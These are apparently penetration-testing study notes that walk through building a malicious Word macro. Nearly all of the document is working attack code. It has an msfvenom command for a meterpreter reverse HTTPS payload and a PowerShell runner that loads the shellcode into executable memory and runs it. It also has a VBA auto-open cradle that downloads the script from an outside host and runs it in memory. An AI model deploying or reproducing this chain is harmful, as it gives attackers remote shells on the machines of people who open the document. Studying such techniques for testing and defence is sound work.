# Powershell Shellcode Runner
- Instruct macro to download powershell script
- Run in memory
- Launch as word child process (will run after word closes)

## 1. Translate arguments of required functions
Translate `VirtualAlloc` and `CreateThread`. Instead of `RtlMoveMemory` we'll use the .NET copy method.

```ps
$kernel32 = @"
using System;
Using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr IpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32",CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

Add-Type $kernel32
```

## 2. Generate Powershell Shellcode 
Copy the resulting buffer into our powershell script (x.ps1):
```sh
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 EXITFUNCT=thread -f ps1

[Byte[]] $buf = 0xfc, 0x48 ...
```

Start setting the api arguments:
```ps
$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$addr,$size);

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
```

Save the file as x.ps1 and spin up a webserver:
```sh
python3 -m http.server 4444
```

## 3. Create Cradle
The goal is to trigger this from a word macro. A cradle will download our code into memory and execute it.
```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:4444/x.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

## 4. Troubleshooting
We can see that our webserver receives the download request, but we are not seeing a shell. This is because our process is being terminated before it can start. Our current shell dies as soon as the PowerShell process terminates.

## 5. WaitSingleObject API
Instruct PS to delay termination until our shell fully executes.
- CreateThread will return a handle to the newly created thread
- Pass new handle to WaitForSingleObject
- 0xFFFFFFFF instructs the program to wait forever or until we exit the shell
- Type cast this value to a NET static type unsigned int [uint32], as PS only uses signed int 
```sh
[DllImport("kernel32.dll")]
public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```
